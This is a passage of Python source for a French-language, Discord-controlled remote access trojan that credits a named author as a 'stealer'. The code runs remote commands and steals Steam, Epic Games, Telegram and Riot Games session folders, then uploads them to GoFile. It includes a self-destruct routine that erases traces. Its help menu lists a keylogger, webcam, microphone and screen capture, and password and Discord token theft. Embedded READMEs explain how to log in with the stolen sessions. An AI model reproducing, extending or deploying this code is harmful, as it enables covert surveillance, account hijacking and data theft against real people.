                file = discord.File(f"{rat_folder}/exeout_result.txt" if os.path.exists(rat_folder) else "exeout_result.txt", filename="exeout_result.txt")
                await ctx.send(file=file)

            if not os.path.exists(rat_folder):
                try:
                    os.remove("exeout_result.txt")
                except Exception as e:
                    await ctx.send(f"> :x: **Impossible de suprimmer le fichier de résultat :** {e}")

        else:        
            exeout_embed = discord.Embed(
                title="Commande executée.",
                description=f"La commande {cmd} a été exécutée sur l'ordinateur cible.\n\n**Sans console :** {"Oui" if noconsole == True else "Non"}\n\n**Résultat de la commande :**\n{result.stdout}",
                
            )
            await ctx.send(embed=exeout_embed)

    except Exception as e:
        error_embed = discord.Embed(
                title="Une erreur est survenue",
                description=f"Il semblerait qu'une erreur soit survenue lors de l'execution de la commande.\n\n**Détails :** {e}",
                color=discord.Color.red()
        )
        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def tasklist(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()

    try:
        result = subprocess.run("tasklist", shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        successfully_recovered_tasklist_embed = discord.Embed(
            title="Liste des processus en cours récupérées",
            
        )
        await ctx.send(embed=successfully_recovered_tasklist_embed)

        with open("tasklist.txt", "w", encoding='utf-8') as file:
            file.write(f"<==============================[ALL TASKS ON EXECUTION FOR {user}]==============================>\n\n{result.stdout}")
            file = discord.File("tasklist.txt", filename="tasklist.txt")
            await ctx.send(file=file)
        os.remove("tasklist.txt")

    except Exception as e:
        error_embed = discord.Embed(
                title="Une erreur est survenue",
                description=f"Il semblerait qu'une erreur soit survenue lors de la récupération de la liste des processus en cours sur l'appreil ` {user} `.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def edgepage(ctx, *, website):
    if not isUser(ctx):
        return
    try:
        subprocess.run(f'cmd /c "start msedge.exe {website}"', creationflags=subprocess.CREATE_NO_WINDOW)
        page_opened_embed = discord.Embed(
            title="Page ouverte",
            description=f"Une page à été ouverte avec l'url {website} sur Edge.",
        )
        await ctx.send(embed=page_opened_embed)
    except Exception as e:
        error_embed = discord.Embed(
                title="Une erreur est survenue",
                description=f"Il semblerait qu'une erreur soit survenue lors de l'exécution de la commande sur l'url {website}'.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def chromepage(ctx, *, website):
    if not isUser(ctx):
        return
    try:
        subprocess.run(f'cmd /c "start chrome.exe {website}"', creationflags=subprocess.CREATE_NO_WINDOW)

        page_opened_embed = discord.Embed(
            title="Page ouverte",
            description=f"Une page à été ouverte avec l'url {website} sur Chrome.",
        )
        await ctx.send(embed=page_opened_embed)

    except Exception as e:
        error_embed = discord.Embed(
                title="Une erreur est survenue",
                description=f"Il semblerait qu'une erreur soit survenue lors de l'exécution de la commande sur l'url {website}'.\n\n**Détails :** {e}",
                color=discord.Color.red()
            )
        await ctx.send(embed=error_embed)

@BOT.hybrid_command()
async def help(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()

    help_embed = discord.Embed(
        title="📌 Liste des commandes du RAT",
        description=f""" 
**🔍 Informations**

• `{BOT.command_prefix}clients` — Voir la liste des clients en lignes
• `{BOT.command_prefix}ip` — Obtenir l'adresse IP de la cible  
• `{BOT.command_prefix}system` — Obtenir les informations système  
• `{BOT.command_prefix}tasklist` — Afficher la liste des processus actifs    


**📸 Surveillance**

• `{BOT.command_prefix}screen` — Capturer l'écran  
• `{BOT.command_prefix}webcam` — Capturer la webcam  
• `{BOT.command_prefix}micrecord [durée en seconde]` — Enregistrer le micro 
• `{BOT.command_prefix}camrecord [durée en seconde]` — Enregistrer la vidéo de la caméra  
• `{BOT.command_prefix}screenrecord [durée en seconde]` — Enregistrer la vidéo de la caméra 
• `{BOT.command_prefix}keylogger [nombre de frappes à enregistrer]` — Activer un keylogger   

**⚙️ Contrôle à distance**

• `{BOT.command_prefix}exe [commande]` — Exécuter une commande  
• `{BOT.command_prefix}exeout [commande]` — Exécuter une commande avec retour  
• `{BOT.command_prefix}shutdown` — Éteindre l'appareil  
• `{BOT.command_prefix}bsod` — Générer un BSOD  
• `{BOT.command_prefix}restart` — Redémarrer l'appareil  

__Note__ : Pour les commandes exeout et exe, introduisez la commande avec "noconsole" pour qu'aucune fenêtre cmd n'apparaisse sur le pc de la victime lors de l'execution.

**Exemple :** {BOT.command_prefix}exe noconsole echo Exemple

**📂 Gestion des fichiers**

• `{BOT.command_prefix}download [url] | [nom_fichier_avec_extenstion]` — Télécharger un fichier  
• `{BOT.command_prefix}upload [chemin]` — Voler un fichier  
• `{BOT.command_prefix}delete [chemin]` — Supprimer un fichier/dossier  
• `{BOT.command_prefix}duplicate [chemin]` — Dupliquer le fichier RAT vers un chemin défini
• `{BOT.command_prefix}moove [chemin du fichier] | [chemin ou déplacer le fichier]` — Déplacer un fichier
• `{BOT.command_prefix}dir [chemin]` — Lister les fichiers dans un répertoire  
• `{BOT.command_prefix}filepath` — Obtenir le chemin complet du fichier RAT  
• `{BOT.command_prefix}rename [chemin di fichier a rename] [nouveau nom avec extension]` — Renommer un fichier
• `{BOT.command_prefix}write [nom avec extension] | [contenu]` — Créer un fichier avec le contenu précisé
• `{BOT.command_prefix}zip [chemin]` — Compresser un dossier
• `{BOT.command_prefix}unzip [chemin]` — Décompresser un dossier
• `{BOT.command_prefix}makedir [chemin]` — Créer un dossier

**📢 Interaction avec l'utilisateur**

• `{BOT.command_prefix}notify [ Nom de l'app | Titre | Message]` — Afficher une notification  
• `{BOT.command_prefix}error [Titre | Message]` — Affiche une fausse erreur système  
• `{BOT.command_prefix}msgbox [Titre | Message]` — Afficher une boîte de message  
• `{BOT.command_prefix}warning [Titre | Message]` — Afficher une msbix d'avertissement  
• `{BOT.command_prefix}type [Titre | Message]` — Simuler une saisie clavier  

**🔑 Exfiltration de données**

• `{BOT.command_prefix}recovery` — Envoyer les infos (mdp, historique, système) à un bot Telegram ou Discord  
• `{BOT.command_prefix}stealpass` — Voler les mots de passe  
• `{BOT.command_prefix}tokens` — Voler les tokens Discord d'utilisateur  
• `{BOT.command_prefix}history` — Obtenir l'historique de navigation (Chrome, Edge) 
• `{BOT.command_prefix}sessions` — Voler les sessions (Steam, Telegram, Riot Games, Epic Games)
• `{BOT.command_prefix}collect` — Collecter toutes les données contenues dans le dossier du RAT

**⛔ Sécurité**

• `{BOT.command_prefix}stop` — Arrêter l’espionnage  
• `{BOT.command_prefix}redbutton` — Effacer un maximum de traces du RAT et surpimmer le fichier infecté (irréversible)

**🌐 Autres**

• `{BOT.command_prefix}edgepage [url]` — Ouvrir une page web via Edge  
• `{BOT.command_prefix}chromepage [url]` — Ouvrir une page web via Chrome  
""",
        
    )

    help_embed.set_thumbnail(
        url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
    )

    help_embed.set_footer(
        text=f"💻 Appareil surveillé : {user}"
    )

    await ctx.send(embed=help_embed)

@BOT.hybrid_command()
async def download(ctx, *, content: str=None):
    if not isUser(ctx):
        return
    user = os.getlogin() 
    try:
        url, filename = content.split(" | ")
    except Exception as e:
        await ctx.send(f"> :x: **Erreur :** {e}")
        await ctx.send(f"**Conseil :** Vérifiez la syntaxe de votre commande. Elle doit respecter ce format : `{BOT.command_prefix}download <url du fichier> | <nom que vous voulez donner>`\n> __Emxemple :__ {BOT.command_prefix}download https://exemple.com/file/fichier.exe")
        return

    try:
        rsp = requests.get(url)
        if rsp.status_code != 200:
            await ctx.send(f"> **URL invalide :** {rsp.status_code}")
            return
    except Exception as e:
        await ctx.send(f"> :x: **Impossible de se connecter à l'url fourni :** {e}")
        return
    
    try:
        save_path = f"C:/Users/{user}/UserSystem/{filename}" if os.path.exists(f"C:/Users/{user}/UserSystem") else f"./{filename}"
        
        with open(save_path, "wb") as file:
            file.write(rsp.content)
        
        downloaded_embed = discord.Embed(
            title="Fichier téléchargé",
            description=f"""**Nom :** {filename}
**Chemin :** {os.path.abspath(save_path)}""",
            color=discord.Color.green()
        )

        await ctx.send(embed=downloaded_embed)

    except Exception as e:
        await ctx.send(f">  :x: **Impossible de créer le fichier :** {e}")
        return

@BOT.hybrid_command()
async def redbutton(ctx):
    if not isUser(ctx):
        return
    temp_delete_script = f"tmp_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))}.bat"
    temp_delete_script_path = os.path.join(os.getenv("TEMP"), temp_delete_script)

    user = os.getlogin()
    current_file = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
    filename = os.path.basename(current_file)

    rat_folder_path = f"C:/Users/{user}/UserSystem"
    startup_path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    startup_rat = os.path.join(startup_path, filename)

    await ctx.send(f"> **Tentative de suppression de toute trace du RAT...**")

    rat_folder_details = ":x: **Dossier du RAT :** Inexistant ou déjà supprimé."
    if os.path.exists(rat_folder_path):
        try:
            shutil.rmtree(rat_folder_path)
            rat_folder_details = f":white_check_mark: **Dossier du RAT :** Supprimé avec succès (`{rat_folder_path}`)"
        except Exception as e:
            rat_folder_details = f":x: **Dossier du RAT :** Impossible de supprimer : {e}"

    startup_details = ":x: **Démarrage :** Aucun fichier détecté."
    if os.path.exists(startup_rat):
        if sys.executable == startup_rat:
            startup_details = "**Démarrage :** Le fichier en cours d'exécution est celui de démarrage. L'autosuppression se fera lors de la deuxième étape."
        else:
            try:
                os.remove(startup_rat)
                startup_details = ":white_check_mark: **Démarrage :** Fichier supprimé dans le dossier de démarrage."
            except Exception as e:
                startup_details = f":x: **Démarrage :** Impossible de supprimer : {e}"

    autodelete_embed = discord.Embed(
        title="Fin de la première étape de l'autodestruction",
        description=f"""
{startup_details}

{rat_folder_details}
"""
    )
    await ctx.send(embed=autodelete_embed)
    await ctx.send(f"> **Lancement de la deuxième et dernière étape : suppression du fichier en cours d'exécution.**")

    delete_script = f"""
@echo off
timeout /t 2 >nul
del "{current_file}"
del "%~f0"
"""
    try:
        with open(temp_delete_script_path, "w", encoding='utf-8') as file:
            file.write(delete_script)
        subprocess.Popen(temp_delete_script_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        await ctx.send(f"> :x: **Impossible d'autodétruire le RAT : {e}**")

@BOT.hybrid_command()
async def collect(ctx):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder = f"C:/Users/{user}/UserSystem"

    if not os.path.exists(rat_folder):
        await ctx.send(fr"> :x: **Le dossier du RAT (C:\Users\{user}\UserSystem) n'existe pas ou a été suprimmé**")
        return

    try:
        shutil.make_archive(f"C:/Users/{user}/collected_datas", "zip", rat_folder)
        await ctx.send("> **Dossier compressé créé**")
    except Exception as e:
        await ctx.send(f"> :x: **Impossible de créer un dossier compressé : {e}")
        return

    file_path = f"C:/Users/{user}/collected_datas.zip"
    gofile_url = "https://store1.gofile.io/uploadFile"
    files = {'file': open(file_path, 'rb')}
    try:
        response = requests.post(gofile_url, files=files)
    except Exception as e:
        await ctx.send(f"> :x: Erreur :** {e}")
        return
    
    if response.status_code == 200:
        json_data = response.json()
        if json_data['status'] == 'ok':
            file_link = json_data["data"]["downloadPage"]
            await ctx.send("> **Données uploadées vers GoFile avec succès !**")
            await ctx.send(f"> Cliquez __**[ici]({file_link})**__ pour télécharger les données")
        else:
            pass
    else:
        await ctx.send(f"> :x: **Erreur :** {e}")
        return

    try:
        os.remove(f"C:/Users/{user}/collected_datas.zip")
    except Exception as e:
        await ctx.send(f"> :x: **Impossible de suprimmer le dossier compressé :** {e}")

@BOT.hybrid_command()
async def moove(ctx, *, pathes):
    if not isUser(ctx):
        return
    try:
        path1, path2 = pathes.split(" | ")
    except:
        await ctx.send(fr""":x: **Veuillez respcter le format suivant :** `{BOT.command_prefix}moove <chemin du fichier> | <chemin ou il doit être déplacé>`
__Exemple__ : {BOT.command_prefix}moove C:\Users\utilisateur\fichier.txt | C:\Users\utilisateur\Bureau""")
        return

    if not os.path.exists(path1):
        await ctx.send(f"> :x: **Le chemin** {path1} **n'existe pas**")
        return
    elif not os.path.exists(path2):
        await ctx.send(f"> :x: **Le chemin** {path2} **n'existe pas**")
        return

    try:
        shutil.move(path1, path2)
        await ctx.send(f"> **Le fichier situé à l'adresse** {path1} **à été déplacé vers le chemin** {path2}")
    except Exception as e:
        await ctx.send(f"> :x: **Erreur :** {e}")

@BOT.hybrid_command()
async def sessions(ctx, arg=None):
    if not isUser(ctx):
        return
    user = os.getlogin()
    rat_folder = f"C:/Users/{user}/UserSystem"

    if arg in ["help", "Help", "HELP"]:
        help_embed = discord.Embed(
            title="Liste des sessions",
            description="""
- Telegram

- EpicGames

- Steam

- Riot Games
"""
        )

        await ctx.send(embed=help_embed)
        return
    elif arg == None:
        pass

    how_to_use_EG = r"""
                        ______________________
<======================[STEALER BY K4L4SHNIK0V]======================>
                   ________________________________
<=================[https://github.com/k4l4shnik0pyw]=================>

1. Installer Epic Games Launcher
   - Téléchargez et installez l'Epic Games Launcher depuis le site officiel : https://www.epicgames.com/store.

2. Fermer le Launcher
   - Une fois installé, fermez complètement le logiciel pour éviter tout conflit.

3. Localiser le dossier de configuration
   - Accédez aux dossiers suivants sur le nouvel ordinateur :

     C:\Program Files (x86)\Epic Games\Launcher\Engine\Config
     C:\Program Files (x86)\Epic Games\Launcher\Portal\Data

   - Si ces dossiers n'existent pas, ouvrez et fermez le Launcher une fois pour qu'il les crée.

4. Remplacer les fichiers
   - Copiez les fichiers récupérés depuis l'ancien ordinateur (ceux extraits par le script).
   - Collez-les dans les dossiers mentionnés ci-dessus.
   - Si le système vous demande de remplacer les fichiers existants, acceptez.

5. Lancer le Launcher
   - Ouvrez l'Epic Games Launcher sur le nouvel ordinateur.
   - Vous serez connecté automatiquement au compte associé aux fichiers de configuration.


"""

    how_to_use_STEAM = r"""  
                            ______________________
    <======================[STEALER BY K4L4SHNIK0V]======================>
                    ________________________________
    <=================[https://github.com/k4l4shnik0pyw]=================>

    1. Installer Steam
    - Téléchargez et installez Steam depuis le site officiel : https://store.steampowered.com.

    2. Fermer Steam
    - Une fois installé, fermez complètement Steam pour éviter tout conflit.

    3. Localiser le dossier de configuration
    - Accédez aux dossiers suivants sur le nouvel ordinateur :
        C:\Program Files (x86)\Steam\config
        C:\Program Files (x86)\Steam\userdata
    - Si ces dossiers n'existent pas, ouvrez et fermez Steam une fois pour qu'il les crée.

    4. Remplacer les fichiers
    - Copiez les fichiers récupérés depuis l'ancien ordinateur (ceux extraits par le script).
    - Collez-les dans les dossiers mentionnés ci-dessus.
    - Si le système vous demande de remplacer les fichiers existants, acceptez.

    5. Lancer Steam
    - Ouvrez Steam sur le nouvel ordinateur.
    - Vous serez automatiquement connecté au compte associé aux fichiers de configuration, sauf si une vérification en deux étapes est activée.


    """

    how_to_use_TELEGRAM = r"""
                            ______________________
    <======================[STEALER BY K4L4SHNIK0V]======================>
                    ________________________________
    <=================[https://github.com/k4l4shnik0pyw]=================>

    1. Installer Telegram Desktop  
    - Téléchargez et installez Telegram Desktop depuis le site officiel : https://desktop.telegram.org.

    2. Fermer Telegram  
    - Une fois installé, fermez complètement Telegram pour éviter tout conflit.

    3. Localiser le dossier de configuration  
    - Accédez au dossier suivant sur le nouvel ordinateur :  
        C:\Users\<VotreNomUtilisateur>\AppData\Roaming\Telegram Desktop\tdata  
    - Si ce dossier n'existe pas, ouvrez et fermez Telegram une fois pour qu'il soit créé.

    4. Remplacer les fichiers  
    - Copiez le dossier **tdata** récupéré depuis l'ancien ordinateur (extrait par le script).  
    - Collez ce dossier dans :  
        C:\Users\<VotreNomUtilisateur>\AppData\Roaming\Telegram Desktop\  
    - Si le système vous demande de remplacer les fichiers existants, acceptez.

    5. Lancer Telegram  
    - Ouvrez Telegram Desktop sur le nouvel ordinateur.  
    - Vous serez automatiquement connecté au compte associé aux fichiers récupérés, sans besoin de saisir un mot de passe ou un code.  


    """

    how_to_use_RIOT = r"""
                            ______________________
    <======================[STEALER BY K4L4SHNIK0V]======================>
                    ________________________________
    <=================[https://github.com/k4l4shnik0pyw]=================>

    1. Installer Riot Games Client  
    - Téléchargez et installez le client Riot Games depuis le site officiel : https://www.riotgames.com.  

    2. Fermer Riot Games Client  
    - Une fois installé, fermez complètement le client pour éviter tout conflit.  

    3. Localiser le dossier de configuration  
    - Accédez au dossier suivant sur le nouvel ordinateur :  
        C:\Users\<VotreNomUtilisateur>\AppData\Local\Riot Games  
    - Si ce dossier n'existe pas, ouvrez et fermez le client Riot Games une fois pour qu'il soit créé.  

    4. Remplacer les fichiers  
    - Copiez le dossier **Riot Games** récupéré depuis l'ancien ordinateur (extrait par le script).  
    - Collez ce dossier dans :  
        C:\Users\<VotreNomUtilisateur>\AppData\Local\  
    - Si le système vous demande de remplacer les fichiers existants, acceptez.  

    5. Lancer Riot Games Client  
    - Ouvrez le client Riot Games sur le nouvel ordinateur.  
    - Vous serez automatiquement connecté au compte associé aux fichiers récupérés.  

    
    """

    epicgames_pathes = [r"C:\Program Files (x86)\Epic Games\Launcher\Engine\Config", r"C:\Program Files (x86)\Epic Games\Launcher\Portal\Data"]
    riotgames_pathes = [fr"C:\Users\{user}\AppData\Local\Riot Games"]
    telegram_path = [fr"C:\Users\{user}\AppData\Roaming\Telegram Desktop\tdata"]
    steam_pathes = [r"C:\Program Files (x86)\Steam\config", r"C:\Program Files (x86)\Steam\userdata"]

    try:
        if not os.path.exists(f"{rat_folder}/Sessions"):
            os.makedirs(f"{rat_folder}/Sessions")
    except Exception as e:
        await ctx.send(f"> :x: **Erreur :** {e}")
        return
    
    try:
        os.makedirs(f"{rat_folder}/Sessions/Epic Games", exist_ok=True)
        for config_dir in epicgames_pathes:
            if os.path.exists(config_dir):
                epic_games = "Session trouvée"
                stolen_config_file_path = f"{rat_folder}/Sessions/Epic Games/{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                    shutil.rmtree(stolen_config_file_path)

                shutil.copytree(config_dir, stolen_config_file_path)
                with open(f"{rat_folder}/Sessions/Epic Games/README - How to use.txt", "w", encoding='utf-8')as readme_file:
                    readme_file.write(how_to_use_EG)
            else:
                epic_games = "Aucune session trouvée"

    except Exception as e:
        epic_games = f"` An error occured ` : {e}"

    try:
        os.makedirs(f"{rat_folder}/Sessions/Riot Games", exist_ok=True)
        for config_dir in riotgames_pathes:
            if os.path.exists(config_dir):
                riot_games = "Session trouvée"
                stolen_config_file_path = f"{rat_folder}/Sessions/Riot Games/{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                    shutil.rmtree(stolen_config_file_path)

                shutil.copytree(config_dir, stolen_config_file_path)
                with open(f"{rat_folder}/Sessions/Riot Games/README - How to use.txt", "w", encoding='utf-8') as readme_file:
                    readme_file.write(how_to_use_RIOT)
            else:
                riot_games = "Aucune session trouvée"
    except Exception as e:
        riot_games = f"` An error occured ` : {e}"

    try:
        os.makedirs(f"{rat_folder}/Sessions/Telegram", exist_ok=True)
        for config_dir in telegram_path:
            if os.path.exists(config_dir):
                telegram = "Session trouvée"
                stolen_config_file_path = f"{rat_folder}/Sessions/Telegram/{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                    shutil.rmtree(stolen_config_file_path)

                shutil.copytree(config_dir, stolen_config_file_path)
                with open(f"{rat_folder}/Sessions/Telegram/README - How to use.txt", "w", encoding='utf-8')as readme_file:
                    readme_file.write(how_to_use_TELEGRAM)
            else:
                telegram = "Aucune session trouvée"
    except Exception as e:
        telegram = f"` An error occured ` : {e}"

    try:
        os.makedirs(f"{rat_folder}/Sessions/Steam", exist_ok=True)
        for config_dir in steam_pathes:
            if os.path.exists(config_dir):
                steam = "Session trouvée"
                stolen_config_file_path = f"{rat_folder}/Sessions/Steam/{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                    shutil.rmtree(stolen_config_file_path)

                shutil.copytree(config_dir, stolen_config_file_path)
                with open(f"{rat_folder}/Sessions/Steam/README - How to use.txt", "w", encoding='utf-8')as readme_file:
                    readme_file.write(how_to_use_STEAM)
            else:
                steam = "Aucune session trouvée"
    except Exception as e:
        steam = f"` An error occured ` : {e}"

    shutil.make_archive(f"C:/Users/{user}/UserSystem/Sessions", "zip", f"C:/Users/{user}/UserSystem/Sessions")

    file_path = f"C:/Users/{user}/UserSystem/Sessions.zip"
    gofile_url = "https://store1.gofile.io/uploadFile"
    files = {'file': open(file_path, 'rb')}
    try:
        response = requests.post(gofile_url, files=files)
    except Exception as e:
        await ctx.send(f"> :x: Erreur :** {e}")
        return
    
    if response.status_code == 200:
        json_data = response.json()
        if json_data['status'] == 'ok':
            file_link = json_data["data"]["downloadPage"]
            sent_embed = discord.Embed(
                title="Sessions récupérées",
                description=f"""
        **Telegram :** {telegram}
        **Epic Games :** {epic_games}
        **Steam :** {steam}
        **Riot Games :** {riot_games}

        :file_folder: **Lien du dossier :** {file_link}
        """
            )
            sent_embed.set_thumbnail(
                url="https://i.postimg.cc/Px4FZFxg/venom-Photoroom.png"
            )
            await ctx.send(embed=sent_embed)
        else:
            await ctx.send(f"> :x: **Une erreur inconnue est survenu lors de l'upload des sessions vers GoFile**")
            return 

@BOT.hybrid_command()
async def rename(ctx, *, args):
    if not isUser(ctx):
        return
    try:
        filepath, filename = args.split(" | ")
    except:
        await ctx.send(f"> :x: **Mauvaise syntaxe :** veuillez respecter la syntaxe suivante : {BOT.command_prefix}rename <chemin du fichier a renommer> <nouveau nom>\n__**Remarque** :__ Pas besoin de citer un chemin entier pour la partie du nouveau nom ! **Exemple :** {BOT.command_prefix}rename <C:/Users/utilisateur/fichier.txt> <nouveau_nom.txt>")
        return
    
    if not os.path.exists(filepath):
        await ctx.send(f"> :x: **Le fichier situé à l'adresse** {filepath} **n'existe pas**")
        return
    
    splitted_path = os.path.dirname(filepath)

    try:
        os.rename(filepath, os.path.join(splitted_path, filename)) 
        renamed_embed = discord.Embed(
            title="Fichier renommé",
            description=f"Le fichier situé à l'adresse {filepath} a été renommé en {filename}"
        )
        await ctx.send(embed=renamed_embed)
    except Exception as e:
        await ctx.send(f"> :x: **Impossible de renommer le fichier :** {e}")

@BOT.hybrid_command()
async def unzip(ctx, filepath=None):
    if not isUser(ctx):
        return
    if not filepath:
        await ctx.send(f":x: **Mauvaise syntaxe :** Veuillez préciser le chemin du fichier ZIP à décompresser. **Exemple :** {BOT.command_prefix}unzip C:/Users/utilisateur/Bureau/dossier.zip")
        return

    if not os.path.exists(filepath):
        await ctx.send(f"> :x: **Le fichier demandé n'existe pas :** {filepath}")
        return

    if not filepath.lower().endswith(".zip"):
        await ctx.send(f"> :x: **Le fichier fourni n'est pas un fichier ZIP :** {filepath}")
        return

    extracted_folder = filepath.replace(".zip", "")

    try:
        shutil.unpack_archive(filepath, extracted_folder, "zip")
        await ctx.send(f"> ✅ **Le fichier** `{filepath}` **a été décompressé vers** `{extracted_folder}`")
    except Exception as e:
        await ctx.send(f"> :x: **Impossible de décompresser le fichier situé à** `{filepath}` **pour la raison suivante :** {e}")
    
@BOT.hybrid_command()
async def makedir(ctx, path: str):
    if not isUser(ctx):
        return
    if not path:
        await ctx.send(fr"> :x: **Veuillez préciser un chemin ou nom de dossier pour créer le dossier*. Exemple :** {BOT.command_prefix}makedir C:\Users\utilisateur\MonDossier")
        return
    
    try:
        os.makedirs(path)
        await ctx.send(f"> **Dossier créé vers le chemin** {path}")
    except Exception as e:
        await ctx.send(f"> :x: **Impossible de créer le dossier :** {e}")

@BOT.hybrid_command()
async def clients(ctx):
    try:
        addr = socket.gethostbyname(socket.gethostname())
    except:
        addr = "--"

    await ctx.send(f"🟢 **EN LIGNE :** {os.getlogin()} | {addr}")

def validtoken(token):
    url = "https://discord.com/api/v10/users/@me"
    headers = {
        "Authorization": f"Bot {token}"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return True

for token in BOT_TOKENS:
    if validtoken(token):
        BOT.run(token)